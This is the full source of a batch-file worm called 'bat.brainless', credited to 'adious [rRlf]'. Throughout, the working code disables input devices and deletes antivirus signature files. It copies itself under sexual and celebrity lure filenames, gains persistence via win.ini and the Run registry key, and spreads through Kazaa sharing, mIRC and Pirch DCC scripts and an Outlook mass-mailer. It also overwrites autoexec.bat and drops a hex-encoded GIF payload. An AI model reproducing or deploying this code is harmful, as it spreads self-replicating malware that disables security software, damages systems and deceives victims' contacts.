ctty nul

REM disable mouse & keyboard

c:\windows\rundll32.exe mouse,disable
c:\windows\rundll32.exe keyboard,disable
:fake code

657r5yuhdfgjgfhsghsfdghdfghdhdghsrtyy56674575245424252yj1hjg5452utoi12k1hjkl4
8445HGJFJ56747YHFJTFKGJ8TJT5JGHJ1FT8U768U4YTUU2TRU^%&$&%546464&*((&^*%^*56434
^%*#$456734737(*(^(453645FDGD^%$&*HDGH54345$%#^#^^FJFJG4565464647654GF34$^$$$
4564$%^#$^#^643634#^%#YJTHJYT&$%&^$%RHFDU$^$^&^6ret7445yTRHGFTH$Et763746FGH56
fhfghf4563645^&$^&ghjfjU^$*&$%&hHGJF^$745756uHFJGHU%U%&*^7YJHHGJ%&*5UYTUJ^&*5

:name

REM bat.brainless
REM by adious [rRlf]
REM created on 21\10\02
REM using mouse & keyboard disable technique 
REM my first picture payload worm
REM dedicated to all the dumbasses IT (Idiotic tenagers) club memberz
cls
@echo off

:copy self

if not exist c:\brainless.bat copy %0 c:\brainless.bat
if not exist c:\windows\brainless.bat copy %0 c:\windows\brainless.bat
if exist c:\werm goto wermend 
mkdir c:\werm
copy %0 c:\werm\adious_is_great.TXT.bat
copy %0 c:\werm\linkin_park_Crawling.MP3.bat
copy %0 c:\werm\XXX_teen_blowjobs.AVI.bat
copy %0 c:\werm\jlo_nude.ZIP.bat
copy %0 c:\werm\rrlf_is_god.TXT.bat
copy %0 c:\werm\Eris_has_owned_you.TXT.bat
copy %0 c:\werm\XXX_girls_with_huge boobs.GIF.bat
copy %0 c:\donkey_ass.JPEG.bat
copy %0 c:\hot_pam_pictures.GIF.bat
:wermend
attrib +h +s c:\werm
attrib +h +s c:\brainless.bat
attrib +h +s c:\windows\brainless.bat

:del av files
if exist c:\brainless.bat del c:\programme\norton~1\s32integ.dll
if exist c:\brainless.bat del c:\programme\f-prot95\fpwm32.dll
if exist c:\brainless.bat del c:\programme\mcafee\scan.dat
if exist c:\brainless.bat del c:\tbavw95\tbscan.sig
if exist c:\brainless.bat del c:\tbav\tbav.dat 
if exist c:\brainless.bat del c:\programme\tbav\tbav.dat 
if exist c:\brainless.bat del c:\programme\avpersonal\antivir.vdf 

:kazaa werm
echo REGEDIT4>kazaa.reg
echo [HKEY_CURRENT_USER\Software\Kazaa\LocalContent]>>kazaa.reg
echo "DisableSharing"=dword:00000000>>kazaa.reg
echo "DownloadDir"="C:\\Program Files\\KaZaA\\My Shared Folder">>kazaa.reg
echo "Dir0"="012345:c:\\">>kazaa.reg
regedit /s kazaa.reg

:residency
echo [windows]>r
echo load=c:\brainless.bat>>r
echo run=>>r
echo NullPort=None>>r
echo.>>r
copy r + %winbootdir%\win.ini %winbootdir%\system\win.ini
del %winbootdir%\win.ini
move %winbootdir%\system\win.ini %winbootdir%\win.ini
del r

:regester vir
echo REGEDIT4>payload.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>payload.reg
echo "msg"="c:\werm\paylaod.gif">>payload.reg
regedit /s payload.reg

:mIrc_werm

echo [script]>brain.bat 
echo n0=on 1:JOIN:#:{ >>brain.bat 
echo n1= /if ( nick == $me ) { halt } >>brain.bat 
echo n2= /.dcc send $nick c:\werm\brainless.bat >>brain.bat 
echo n3=on *:TEXT:*sex*:#:{ >>brain.bat 
echo n4=.msg $nick Hi,I don't mean to disturb you,but i got some teen sex videos for you to see and i'm sending you them...have fun. >>brain.bat
echo n5= /.dcc send $nick c:\werm\jlo_nude.ZIP.bat >>brain.bat
echo n6= /.dcc send $nick c:\werm\XXX_teen_blowjobs.AVI.bat >>brain.bat
echo n7= }>>brain.bat
if exist c:\mirc\mirc.ini copy brain.bat c:\mirc\script.ini 
if exist c:\mirc32\mirc.ini copy brain.bat c:\mirc32\script.ini 
if exist c:\progra~1\mirc\mirc.ini copy brain.bat c:\progra~1\mirc\script.ini 
if exist c:\progra~1\mirc32\mirc.ini copy brain.bat c:\progra~1\mirc32\script.ini 
del brain.bat

:pirch werm

del c:\pirch98\events.ini
echo [Levels]>pirch
echo Enabled=1>>pirch
echo Count=6>>pirch
echo Level1=000-Unknowns>>pirch
echo 000-UnknownsEnabled=1>>pirch
echo Level2=100-Level 100>>pirch
echo 100-Level 100Enabled=1>>pirch
echo Level3=200-Level 200>>pirch
echo 200-Level 200Enabled=1>>pirch
echo Level4=300-Level 300>>pirch
echo 300-Level 300Enabled=1>>pirch
echo Level5=400-Level 400>>pirch
echo 400-Level 400Enabled=1>>pirch
echo Level6=500-Level 500>>pirch
echo 500-Level 500Enabled=1>>pirch
echo.>>pirch
echo [000-Unknowns]>>pirch
echo User1=*!*@*>>pirch
echo UserCount=1>>pirch
echo Event1=ON JOIN:#:/dcc send $nick c:\brainless.bat>>pirch
echo EventCount=1>>pirch
echo.>>pirch
echo [100-Level 100]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
echo.>>pirch
echo [200-Level 200]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
echo.>>pirch
echo [300-Level 300]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
echo.>>pirch
echo [400-Level 400]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
echo.>>pirch
echo [500-Level 500]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
move pirch c:\pirch98\events.ini
del pirch

:massmailer
if exist c:\windows\system\mmailer.vbs goto finnishedmmail
echo.on error resume next >c:\windows\system\mmailer.vbs 
echo dim a,b,c,d,e >>c:\windows\system\mmailer.vbs 
echo set a = Wscript.CreateObject("Wscript.Shell") >>c:\windows\system\mmailer.vbs 
echo set b = CreateObject("Outlook.Application") >>c:\windows\system\mmailer.vbs 
echo set c = b.GetNameSpace("MAPI") >>c:\windows\system\mmailer.vbs 
echo for y = 1 To c.AddressLists.Count >>c:\windows\system\mmailer.vbs 
echo set d = c.AddressLists(y) >>c:\windows\system\mmailer.vbs 
echo x = 1 >>c:\windows\system\mmailer.vbs 
echo set e = b.CreateItem(0) >>c:\windows\system\mmailer.vbs 
echo for o = 1 To d.AddressEntries.Count >>c:\windows\system\mmailer.vbs 
echo f = d.AddressEntries(x) >>c:\windows\system\mmailer.vbs 
echo e.Recipients.Add f >>c:\windows\system\mmailer.vbs 
echo x = x + 1 >>c:\windows\system\mmailer.vbs 
echo next >>c:\windows\system\mmailer.vbs 
echo e.Subject = "Nude pics" >>c:\windows\system\mmailer.vbs 
echo e.Body = "I attached a zip file with nude pics of jlo.Hope you enjoyed it" >>c:\windows\system\mmailer.vbs 
echo e.Attachments.Add ("c:\werm\jlo_nude.ZIP.bat") >>c:\windows\system\mmailer.vbs 
echo e.DeleteAfterSubmit = False >>c:\windows\system\mmailer.vbs 
echo e.Send >>c:\windows\system\mmailer.vbs 
echo f = "" >>c:\windows\system\mmailer.vbs 
echo next >>c:\windows\system\mmailer.vbs 
start c:\windows\system\mmailer.vbs 
:finnishedmmailer

:payload txt
del c:\autoexec.bat
echo @echo off >c:\autoexec.bat
echo echo 00000000000000000000000000 >>c:\autoexec.bat
echo echo If you get this virus,then your just >>c:\autoexec.bat
echo echo BRAINLESS!!!! >>c:\autoexec.bat
echo echo >>c:\autoexec.bat
echo echo bat.brainless >>c:\autoexec.bat
echo echo the return of the dreaded DOS batch virus >>c:\autoexec.bat
echo echo the creation of the labs of adious [rRlf] >>c:\autoexec.bat
echo echo 00000000000000000000000000 >>c:\autoexec.bat
echo pause >>c:\autoexec.bat

:paylaod picture

if exist c:\werm\payload.gif goto endofpic
echo e 0100  47 49 46 38 37 61 41 02 EA 01 F7 00 00 00 00 00>>paylaodpic
echo e 0110  80 80 80 80 00 00 80 80 00 00 80 00 00 80 80 00>>paylaodpic
echo e 0120  00 80 80 00 80 80 80 40 00 40 40 00 80 FF 00 40>>paylaodpic
echo e 0130  80 40 00 FF 80 40 00 FF FF FF C0 C0 C0 FF 00 00>>paylaodpic
echo e 0140  FF FF 00 00 FF 00 00 FF FF 00 00 FF FF 00 FF FF>>paylaodpic
echo e 0150  FF 80 00 FF 80 80 FF FF 80 80 FF FF 00 80 FF 80>>paylaodpic
echo e 0160  40 2C 00 00 FF 7A 64 40 1A D7 E7 3D BD D7 FF FF>>paylaodpic
echo e 0170  00 00 00 00 1A D7 7E 4C 98 03 00 00 40 19 C3 BF>>paylaodpic
echo e 0180  9E 9D 00 00 00 10 00 00 B4 00 07 02 00 00 02 47>>paylaodpic
echo e 0190  E8 8B 16 C7 00 17 BF 00 00 00 07 07 10 02 4C 98>>paylaodpic
echo e 01A0  02 00 00 10 4E 24 12 84 A4 02 4C 98 5F 00 00 6F>>paylaodpic
echo e 01B0  01 67 67 00 00 B6 00 00 6C BF F7 78 81 5A 46 5F>>paylaodpic
echo e 01C0  4D 88 5F 40 40 5F 4D 03 00 00 AC 00 00 AC 00 56>>paylaodpic
echo e 01D0  78 00 56 A8 5F 4D 04 00 56 42 00 56 AC 5F 49 AC>>paylaodpic
echo e 01E0  00 56 EC 00 56 F2 00 56 00 5F 49 F8 00 00 54 00>>paylaodpic
echo e 01F0  56 AC 5F 40 AC 00 56 08 00 56 C4 00 56 FF 5F 49>>paylaodpic
echo e 0200  14 FF FF FB 00 56 01 5F 41 AC 00 00 E4 00 56 D4>>paylaodpic
echo e 0210  00 56 FF 5F 49 F0 FF FF B8 00 56 38 01 01 00 01>>paylaodpic
echo e 0220  03 00 00 69 55 00 00 74 69 74 00 64 65 00 00 00>>paylaodpic
echo e 0230  00 00 00 BD 85 5A 01 17 A7 27 85 D0 67 00 31 02>>paylaodpic
echo e 0240  4E 24 68 00 00 52 85 E4 01 17 BF D7 00 00 14 00>>paylaodpic
echo e 0250  46 00 00 12 3C 02 00 27 86 28 1E 20 4A 00 00 02>>paylaodpic
echo e 0260  31 02 00 00 00 67 46 67 D7 67 00 31 00 00 00 00>>paylaodpic
echo e 0270  00 00 00 00 00 04 2C 5F 00 00 00 00 00 00 5F 2C>>paylaodpic
echo e 0280  5F 01 00 00 BE 16 CF 00 03 74 00 00 00 04 00 00>>paylaodpic
echo e 0290  00 01 11 BF 00 00 14 10 E3 31 00 12 14 00 67 00>>paylaodpic
echo e 02A0  00 12 01 02 00 00 00 00 5F 00 00 02 52 74 5F 00>>paylaodpic
echo e 02B0  00 08 07 3C 00 0B 7C 00 00 02 00 00 01 00 02 00>>paylaodpic
echo e 02C0  10 00 00 00 00 56 5C 01 00 00 BF F7 C9 01 00 00>>paylaodpic
echo e 02D0  BF F7 C4 01 00 10 00 56 FF 00 56 15 00 00 C4 BF>>paylaodpic
echo e 02E0  F8 76 00 56 09 BF F8 00 00 00 A0 01 03 10 01 03>>paylaodpic
echo e 02F0  FF 00 56 15 00 00 58 BF F8 E0 00 56 5C 00 01 04>>paylaodpic
echo e 0300  BF F7 C9 00 56 00 BF F7 03 01 00 58 00 00 00 00>>paylaodpic
echo e 0310  56 15 BF F5 06 BF F8 A0 00 00 90 01 03 00 80 00>>paylaodpic
echo e 0320  00 00 00 58 00 00 00 00 56 00 01 00 5C 01 00 00>>paylaodpic
echo e 0330  BF F7 C9 01 00 00 BF F7 EC 01 00 00 00 56 00 01>>paylaodpic
echo e 0340  00 15 01 00 25 BF F8 00 BF F8 01 01 00 02 01 00>>paylaodpic
echo e 0350  C8 00 00 00 00 56 CF 00 00 BF 87 DC 57 05 97 CF>>paylaodpic
echo e 0360  00 00 67 FC 86 BC 00 56 00 00 56 3C 00 00 14 00>>paylaodpic
echo e 0370  56 E8 BF FB FF BF F7 04 FF FF A6 00 56 00 BF F8>>paylaodpic
echo e 0380  00 01 00 2C 01 04 1A 87 6E 00 00 00 98 00 02 00>>paylaodpic
echo e 0390  00 00 00 BC 96 00 0F A0 00 0F D0 DF 87 28 E2 01>>paylaodpic
echo e 03A0  3F 01 0F D0 6A 01 57 3F 4A E9 57 13 64 00 0F A0>>paylaodpic
echo e 03B0  00 0F D0 00 87 6A 00 87 52 00 00 00 00 00 01 EE>>paylaodpic
echo e 03C0  00 00 5F BF F7 D4 00 00 94 BF F7 9C 00 00 84 00>>paylaodpic
echo e 03D0  56 54 00 0A 2C 00 04 91 00 59 00 BF F7 5E 09 86>>paylaodpic
echo e 03E0  00 BC 96 92 00 00 86 64 3A 06 02 26 C7 4F 4D 4A>>paylaodpic
echo e 03F0  00 01 CF 00 04 48 87 A8 86 04 5F 56 00 00 66 8B>>paylaodpic
echo e 0400  CA 96 BC 96 E4 05 CF 6F 13 99 12 12 1A 21 F9 04>>paylaodpic
echo e 0410  00 00 00 00 00 2C 00 00 00 00 41 02 EA 01 00 08>>paylaodpic
echo e 0420  AF 00 01 08 1C 48 B0 A0 C1 83 08 13 2A 5C C8 B0>>paylaodpic
echo e 0430  A1 C3 87 10 23 4A 9C 48 B1 A2 C5 8B 18 33 6A DC>>paylaodpic
echo e 0440  C8 B1 A3 C7 8F 20 43 8A 1C 49 B2 A4 C9 93 28 53>>paylaodpic
echo e 0450  AA 5C C9 B2 A5 CB 97 30 63 CA 9C 49 B3 A6 CD 9B>>paylaodpic
echo e 0460  38 73 EA DC C9 B3 A7 CF 9F 40 83 0A 1D 4A B4 A8>>paylaodpic
echo e 0470  D1 A3 48 93 2A 5D CA B4 A9 D3 A7 50 A3 4A 9D 4A>>paylaodpic
echo e 0480  B5 AA D5 AB 58 B3 6A DD CA B5 AB D7 AF 60 C3 8A>>paylaodpic
echo e 0490  1D 4B B6 AC D9 B3 68 D3 AA 5D CB B6 AD DB B7 70>>paylaodpic
echo e 04A0  E3 CA 9D 4B B7 AE DD BB 78 F3 EA DD CB B7 AF DF>>paylaodpic
echo e 04B0  BF 80 03 0B 1E 4C B8 B0 E1 C3 88 13 2B 5E CC B8>>paylaodpic
echo e 04C0  B1 E3 C7 90 23 4B 9E 4C B9 B2 E5 CB 98 33 6B DE>>paylaodpic
echo e 04D0  48 CC B9 B3 E7 CF A0 43 8B 1E 4D BA B4 E9 D3 A8>>paylaodpic
echo e 04E0  53 AB 5E CD BA B5 EB D7 B0 63 CB 9E 4D BB B6 ED>>paylaodpic
echo e 04F0  DB B8 73 EB DE CD BB B7 EF DF C0 83 0B 1F 4E BC>>paylaodpic
echo e 0500  B8 F1 E3 C8 93 2B 5F CE BC B9 F3 E7 D0 A3 4B 9F>>paylaodpic
echo e 0510  4E BD BA F5 EB D8 B3 6B DF 3A CE BD BB F7 EF E0>>paylaodpic
echo e 0520  C3 8B 1F 4F BE BC F9 F3 E8 D3 AB 5F CF BE BD FB>>paylaodpic
echo e 0530  F7 F0 E3 CB 9F 4F BF BE FD FB F8 F3 EB DF CF BF>>paylaodpic
echo e 0540  BF FF FF 00 06 28 E0 80 04 16 68 E0 81 08 26 A8>>paylaodpic
echo e 0550  E0 82 0C 36 33 E8 E0 83 10 46 28 E1 84 14 56 68>>paylaodpic
echo e 0560  E1 85 18 66 A8 E1 86 1C 76 E8 E1 87 20 86 28 E2>>paylaodpic
echo e 0570  88 24 96 68 E2 89 28 A6 A8 E2 8A 2C B6 E8 E2 8B>>paylaodpic
echo e 0580  30 C6 28 E3 8C 34 D6 68 FF E3 8D 38 E6 A8 E3 8E>>paylaodpic
echo e 0590  3C F6 E8 E3 8F 40 06 29 E4 90 44 16 D9 DC 06 48>>paylaodpic
echo e 05A0  6E 80 50 92 4C 2A B9 24 93 07 35 D9 E4 40 52 42>>paylaodpic
echo e 05B0  69 51 95 58 16 84 E5 96 0A 25 19 91 94 02 79 F9>>paylaodpic
echo e 05C0  D1 94 51 66 49 90 99 14 6D 89 66 99 62 72 A4 26>>paylaodpic
echo e 05D0  97 6B 02 10 27 95 64 86 A9 24 97 67 56 19 5B 9D>>paylaodpic
echo e 05E0  79 82 69 10 9E 74 A2 A9 E6 45 6F 5A 19 68 A1 48>>paylaodpic
echo e 05F0  76 99 A8 43 70 2E EA E6 9C 80 DA E9 67 9A 88 B6>>paylaodpic
echo e 0600  A9 E5 9C 57 56 0A 65 9C 90 36 7A 27 A7 7A C2 36>>paylaodpic
echo e 0610  E9 A1 86 4A 3A A8 A9 93 9E 5A 91 A6 97 B2 9A 90>>paylaodpic
echo e 0620  A5 8A 16 FA E8 9B 7D 8E 2A 67 A8 94 BA 5A 6B A4>>paylaodpic
echo e 0630  99 6A 9A 28 A8 A3 FA 7A 2B AE A8 C2 EA 1A 9F 7D>>paylaodpic
echo e 0640  FE 59 EA B0 8E 4A BA 90 B1 1A 41 9B 6C A0 D3 3E>>paylaodpic
echo e 0650  E9 24 43 CB 32 BB 11 B2 C8 0E 6B ED B5 84 36 6B>>paylaodpic
echo e 0660  29 AC DC 66 DB 6B AC D4 A2 BB 2B 9B E2 36 5B EB>>paylaodpic
echo e 0670  6D DD 3A DB 2A B8 87 B6 FA AC BB DB E2 6B 6F BA>>paylaodpic
echo e 0680  F2 BE CA A8 B4 D2 4E 64 FF 6E B6 D0 9A 9B 6B B5>>paylaodpic
echo e 0690  DE BE AB AC BE AB 32 DC 6F C0 FD 9A FA EA B8 FA>>paylaodpic
echo e 06A0  1A 2C 6A BC E4 06 5C 2A C5 E0 42 7C AE BA 11 7B>>paylaodpic
echo e 06B0  4C EF C4 23 F3 1B AE C3 CB 66 EC F0 C1 26 73 5C>>paylaodpic
echo e 06C0  B2 C4 D1 AE DC A6 C8 ED AE 9C 70 C4 DA E6 46 2C>>paylaodpic
echo e 06D0  CE 34 77 3C B3 A3 16 9F 7C AF CF 44 3F FB EF CB>>paylaodpic
echo e 06E0  76 C6 8C 34 CF 35 2F CD 72 C8 35 0F 9D EF D2 3F>>paylaodpic
echo e 06F0  3B CD 31 B6 51 D7 AB 9B 97 29 37 3D 74 D1 0F DB>>paylaodpic
echo e 0700  FC 31 C9 08 8B 7C B4 D3 19 05 9D B3 BC F1 62 74>>paylaodpic
echo e 0710  35 BF 6A AB FD D0 DB 6C 4A 8D F3 DC 8B B6 4D 1B>>paylaodpic
echo e 0720  D7 2A 23 4C 76 BA 64 7A 3C 36 DE 68 FF 49 B8 E0>>paylaodpic
echo e 0730  0D 17 7E B5 DE 1E 41 8C 38 E2 0D D1 BD B0 DD 37>>paylaodpic
echo e 0740  7F F9 AB DC 7B E6 2D F9 E3 59 07 2E 76 E2 12 41>>paylaodpic
echo e 0750  7E E6 E1 3B 0B 8D 35 D1 A5 83 E4 F8 E7 A2 7F 6D>>paylaodpic
echo e 0760  AB DF 93 DF 7D F6 EB B6 55 7D AD E4 7F B3 FD A9>>paylaodpic
echo e 0770  EC 4A 87 FE F9 C9 98 0A CC 7A D3 A9 37 2E F3 F0>>paylaodpic
echo e 0780  85 47 CE 2B EC FB 56 0E 47 11 AD 5B 7B 5D 39 E7>>paylaodpic
echo e 0790  45 F3 FD 69 F2 C2 63 6F F2 48 CB 67 AF 3C EA A4>>paylaodpic
echo e 07A0  92 B4 BA E2 BF 9F 5E BC F3 B1 A3 7F 76 F8 3A BB>>paylaodpic
echo e 07B0  BB 69 D6 94 7B 6B BD FA BD 5B AE FD AC F7 5B FB>>paylaodpic
echo e 07C0  BD DF 98 9B AE FF E9 F5 E3 1D FD E0 56 BE E6 C1>>paylaodpic
echo e 07D0  FF 0C 37 2A BB 9E C2 48 56 BD DB 29 50 75 05 14>>paylaodpic
echo e 07E0  A0 F8 5A F7 AD AF C1 AE 7F A0 63 A0 05 D3 06 BF>>paylaodpic
echo e 07F0  F4 FD 6F 80 F1 3B 60 ED F0 B5 B3 9E CD 0B 68 8C>>paylaodpic
echo e 0800  F3 1F E1 20 08 40 B7 D9 AC 6F 0B CB DF F3 5E 48>>paylaodpic
echo e 0810  43 19 7E 70 7F 20 C3 20 F3 74 88 9A 82 95 0B 65>>paylaodpic
echo e 0820  C6 AA 53 0A 55 78 34 08 5A 2D 82 15 4C E2 F6 44>>paylaodpic
echo e 0830  68 BC 23 02 11 89 B9 C3 61 14 05 E7 BE 8A 51 F0>>paylaodpic
echo e 0840  34 00 23 98 0F AD 58 45 28 AE D0 7E 46 8C 95 0D>>paylaodpic
echo e 0850  63 C8 2E 0F 2E B0 89 E6 2B E3 D4 C0 78 C3 B5 A9>>paylaodpic
echo e 0860  91 77 3C 34 8D C6 82 D8 B5 2D D2 2B 8E 33 CC DF>>paylaodpic
echo e 0870  15 67 17 C3 31 F6 F1 84 66 D4 DA 98 C4 F6 43 2F>>paylaodpic
echo e 0880  B6 D1 7C 77 D4 22 1D 37 C6 30 3C 8A A6 53 5C 54>>paylaodpic
echo e 0890  D5 BC 26 39 35 59 B1 EB 7C D9 43 14 FE 22 B5 3C>>paylaodpic
echo e 08A0  4C 92 8E 76 C5 F2 E4 27 41 B9 AB E0 B9 AA 93 A4>>paylaodpic
echo e 08B0  EC 61 EA E6 88 C9 2D 6E 52 92 A5 1C 62 1E 99 95>>paylaodpic
echo e 08C0  CA 5E BD 0E 95 B2 44 64 2D BB 97 38 5E F6 91 71>>paylaodpic
echo e 08D0  44 9A 0C 25 09 6B 29 C7 E2 D5 90 90 5C 7C 25 2F>>paylaodpic
echo e 08E0  A1 17 40 62 BA 30 8B A5 13 E5 F7 82 07 C8 8E 58>>paylaodpic
echo e 08F0  72 76 D8 8B 26 24 1D 69 A4 6E 7A F3 9B E0 0C A7>>paylaodpic
echo e 0900  38 C7 49 CE 72 9A F3 9C E8 4C A7 3A D7 C9 CE 76>>paylaodpic
echo e 0910  BA F3 9D F0 8C FF A7 3C E7 49 CF 7A DA F3 9E F8>>paylaodpic
echo e 0920  CC A7 3E C9 29 4D EC AC 12 94 6D 03 96 AF F6 68>>paylaodpic
echo e 0930  3F 8A 31 B0 64 B2 9C 52 30 63 99 48 3F 0D 54 98>>paylaodpic
echo e 0940  9C 5C 28 52 FA 79 9D 7F 76 0B 97 85 1C 28 41 75>>paylaodpic
echo e 0950  F9 3E 84 0A 94 7C D6 BB 26 2D 13 68 A5 87 8E 94>>paylaodpic
echo e 0960  99 27 F5 25 50 28 6A 1D 8B 32 12 A5 1F D5 E8 46>>paylaodpic
echo e 0970  2F 89 D2 94 0A 31 85 60 12 96 30 4F 28 26 93 9A>>paylaodpic
echo e 0980  14 A2 2A 0D CA 4C A5 C3 CA 3F AE 8B 79 FC 6B E4>>paylaodpic
echo e 0990  50 8F 5A 4D 54 35 95 96 07 0D A4 1B 4D D8 B2 0E>>paylaodpic
echo e 09A0  D2 CF 95 6F 9C A8 21 A9 83 55 4A 7A 55 82 CE 63>>paylaodpic
echo e 09B0  A5 1F CF F8 D5 81 B9 0C 69 17 55 2A 0A 9D 58 36>>paylaodpic
echo e 09C0  AB 42 B3 6E 4A 3C CA 52 A3 D3 55 41 92 71 89 06>>paylaodpic
echo e 09D0  04 E1 5C E3 B6 56 B4 DA 2E 92 C3 F4 AB 03 D9 5A>>paylaodpic
echo e 09E0  55 B0 E1 55 7D E3 53 CA 5C E9 DA 45 B8 4E B1 86>>paylaodpic
echo e 09F0  79 8D AC F7 28 47 D5 93 F2 74 64 45 05 EB E6 DC>>paylaodpic
echo e 0A00  AA 56 C7 7A 36 26 57 5C 2C 63 07 9B D5 37 56 56>>paylaodpic
echo e 0A10  80 DC 3C AC 18 D5 37 38 BF 64 2D 32 77 A7 DD 6C>>paylaodpic
echo e 0A20  43 55 AB DA D4 36 31 82 A2 85 4E 47 3D 0A 52 DA>>paylaodpic
echo e 0A30  86 15 B0 1C D4 23 F2 9C 65 A8 8E 4A 35 6C 84 8D>>paylaodpic
echo e 0A40  E2 07 A9 08 5C 9A E4 D2 B7 E1 31 E6 70 35 DB C5>>paylaodpic
echo e 0A50  9A 66 70 96 2D EC 69 48 EF F6 56 DF 9E F6 5B 43>>paylaodpic
echo e 0A60  AC 94 4D 9E 0B 56 F1 E8 8D 7A DE AD 2E 35 27 8B>>paylaodpic
echo e 0A70  5D BB 55 ED 66 AF 7D EA 77 8F CB 50 B4 89 B4 26>>paylaodpic
echo e 0A80  A1 DD AA 3F 8F D7 5B EA 36 74 BD EC FD A2 7B FB>>paylaodpic
echo e 0A90  FA DE CB DA 6A BE 92 35 B0 7D 61 A9 58 FD 56 94>>paylaodpic
echo e 0AA0  BF 52 FC 6E 02 67 E5 BB FE 9E F5 82 D6 45 30 52>>paylaodpic
echo e 0AB0  AB C5 DC FF 3A 25 B7 44 E5 AF 13 49 0B 32 EE 8A>>paylaodpic
echo e 0AC0  36 BF C7 84 1A EE 6C FA 32 0D 43 B7 C0 25 66 A2>>paylaodpic
echo e 0AD0  56 C7 FA E0 E4 DE 50 C2 91 54 9A 70 93 0B C3 25>>paylaodpic
echo e 0AE0  8A CE C5 E5 CD EC 0E 41 FC 12 22 DC EB 36 C5 71>>paylaodpic
echo e 0AF0  C5 71 8B 17 CB 5C B2 2E B0 C7 26 CE 26 64 63 FC>>paylaodpic
echo e 0B00  59 0C 2F D9 C1 33 31 F2 73 3A CC 5B CC 3E 91 BE>>paylaodpic
echo e 0B10  4C 1E 1F F8 EE 5A 5E F4 B5 4E C8 CA AD B2 8F BF>>paylaodpic
echo e 0B20  1C 42 91 A0 D8 3D 5C FE AF 97 49 4A 5F 10 E6 31>>paylaodpic
echo e 0B30  B0 17 66 AA 9D A3 7C 67 39 B7 90 CA 6B A6 9A 88>>paylaodpic
echo e 0B40  69 3C CD FB 69 59 39 D6 25 95 29 45 DA 3D 67 BA>>paylaodpic
echo e 0B50  8E C1 0B C5 54 96 EE FB CB F3 D5 54 A3 8A B6 63>>paylaodpic
echo e 0B60  73 B9 C7 C3 43 27 27 D1 F5 E5 28 49 0D 46 DE 83>>paylaodpic
echo e 0B70  52 93 57 92 D6 13 A5 69 1A B4 4B FF 74 99 66 F5>>paylaodpic
echo e 0B80  34 FB 04 7C 1E 50 3F 55 97 AC 7E 22 A1 33 CD C7>>paylaodpic
echo e 0B90  4A 77 79 B7 00 2E A5 A8 47 7D 4D 5F 92 1A CB 45>>paylaodpic
echo e 0BA0  64 E3 3E 6B BC 6C AE 3A BA D9 C5 61 29 B4 85 23>>paylaodpic
echo e 0BB0  ED 69 5B FB DA D8 CE B6 B6 B7 CD ED 6E 7B FB DB>>paylaodpic
echo e 0BC0  E0 0E B7 B8 C7 4D EE 72 2A 9B FB DC E8 4E B7 BA>>paylaodpic
echo e 0BD0  D7 CD EE 76 BB FB DD F0 8E B7 BC E7 4D EF 7A DB>>paylaodpic
echo e 0BE0  FB DE F8 CE B7 BE F7 CD EF 7E FB FB DF 00 0F B8>>paylaodpic
echo e 0BF0  C0 07 4E 27 F0 82 1B FC E0 08 4F B8 C2 17 CE F0>>paylaodpic
echo e 0C00  86 3B FC E1 10 8F B8 C4 27 4E F1 8A 5B FC E2 18>>paylaodpic
echo e 0C10  CF B8 C6 37 CE F1 8E 7B FC E3 20 FF 0F B9 C8 07>>paylaodpic
echo e 0C20  A4 4D DB DE E4 D9 59 46 36 78 65 AD 92 6A 17 A8>>paylaodpic
echo e 0C30  E4 2C AF 33 F0 54 7E 12 4F 07 5B A8 28 3F 10 CC>>paylaodpic
echo e 0C40  69 9E EC 41 9A BC E5 3C 37 70 53 5C 4E 20 F4 A6>>paylaodpic
echo e 0C50  84 E5 31 97 6B D0 53 BE EB FE 18 1D 25 48 5F FA>>paylaodpic
echo e 0C60  D0 A5 0E 5A AA DB E7 E9 35 B7 7A 99 BF 92 F4 95>>paylaodpic
echo e 0C70  74 1D 3E 58 37 49 D4 9B 1E 95 AF 1F 5D EB F4 31>>paylaodpic
echo e 0C80  3A 31 8D AD AB 67 16 4B 8C D2 CB F5 88 F9 AA 5D>>paylaodpic
echo e 0C90  0C 9E D9 D1 AA 1E F4 E5 16 4C 76 EF C8 54 B0 85>>paylaodpic
echo e 0CA0  5E 34 83 81 9A 73 B8 0B BE EE 19 6D A5 27 15 DA>>paylaodpic
echo e 0CB0  4F C8 D9 9A C5 D0 1C 7C 82 21 1F D4 10 63 FA 90>>paylaodpic
echo e 0CC0  72 BF E5 AA 75 1A 5C 4A E7 34 A2 B6 06 70 DB D3>>paylaodpic
echo e 0CD0  9C F9 C8 0F 5E BC 6D CE B4 44 B3 F3 77 D2 FF F2>>paylaodpic
echo e 0CE0  D6 AB 75 FD 2B 61 1F 4A BB C6 3E F5 46 B5 BD 9A>>paylaodpic
echo e 0CF0  6F 9D D6 1C 7F 55 F7 60 96 E9 08 57 4F 79 2D 53>>paylaodpic
echo e 0D00  CF F7 3D DF FD 26 4B 3B 6B 3A B5 17 D0 64 DE F0>>paylaodpic
echo e 0D10  8B D9 BC E1 F8 2A 1F BA BD CC 30 EF EA 19 33 FA>>paylaodpic
echo e 0D20  E2 4B FD F8 1A 4C BE CC 3B 1F FE C9 2B 1B FA 09>>paylaodpic
echo e 0D30  EE 30 EE B7 D7 F8 C2 6F 3D 93 DA 27 3E 62 BA DF>>paylaodpic
echo e 0D40  FD 00 A2 5F 76 8F 1F 7B EA 51 7C F3 B0 4F 7F EE>>paylaodpic
echo e 0D50  9E 17 7A 8F 27 7D 33 07 69 DB 27 1B AD 87 79 32>>paylaodpic
echo e 0D60  47 6C A9 A4 7F 80 76 77 03 58 66 DD 75 7F DE A7>>paylaodpic
echo e 0D70  69 87 57 79 62 C5 79 DA 91 80 D7 97 5E A8 23 79>>paylaodpic
echo e 0D80  EF 77 5D 98 F7 63 F2 37 7E 57 85 4C 00 98 7F 41>>paylaodpic
echo e 0D90  05 82 B5 25 7C DC C1 81 26 58 59 18 03 61 9C 66>>paylaodpic
echo e 0DA0  63 D8 07 55 31 38 5D E3 07 64 13 73 7B 49 53 7E>>paylaodpic
echo e 0DB0  0A 58 81 A5 96 1E E0 77 63 D4 B7 7B 89 B5 41 48>>paylaodpic
echo e 0DC0  F8 3B 68 26 7B 48 A5 7E EB 17 84 2A 16 85 7B B6>>paylaodpic
